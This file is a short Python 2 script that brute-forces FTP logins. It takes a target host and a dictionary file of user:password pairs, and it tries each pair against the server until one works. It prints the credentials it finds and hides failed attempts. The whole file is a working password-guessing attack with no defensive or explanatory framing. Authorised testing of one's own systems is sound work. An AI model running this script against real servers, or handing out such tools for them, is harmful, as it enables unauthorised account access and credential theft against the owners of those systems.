#encoding:utf-8
import socket,ftplib;
socket.setdefaulttimeout(5);
def CheckLogin(host,user,pwd):
	try:
		FTPObj = ftplib.FTP(host);
		Msg= FTPObj.login(user,pwd);
		print "[+] Success login Message:"+Msg;
		print "[*] User:"+user+" Password:"+pwd;
		return True;
	except Exception as e:
		None;
		#print "[-] login faild!";
		#print "[-] "+str(e);


def Main():
	import optparse;
	parser = optparse.OptionParser("Usage: python Script.py -h <host> -d <Dictionary>");
	parser.add_option("-H","--Host",help="this argument is a host eg:192.168.1.1",dest="host",type="string");
	parser.add_option("-d","--Dic",dest="dicfn",type="string",help="this arguemnt is a dictionary file name");
	(option,args)=parser.parse_args();
	Host = option.host;
	DicFN =option.dicfn;
	if(Host == None or DicFN == None):
		print "[-]arguments need  ' --help '";
		exit(0);
	fp = open(DicFN,"r");
	for row in fp.readlines():
		userpwd = row.split(":");
		user = userpwd[0];
		pwd = userpwd[1].strip("\r").strip("\n");
		Success= CheckLogin(Host,user,pwd);
		if(Success):
			break;



if(__name__ == "__main__"):
	Main();
	exit(0);
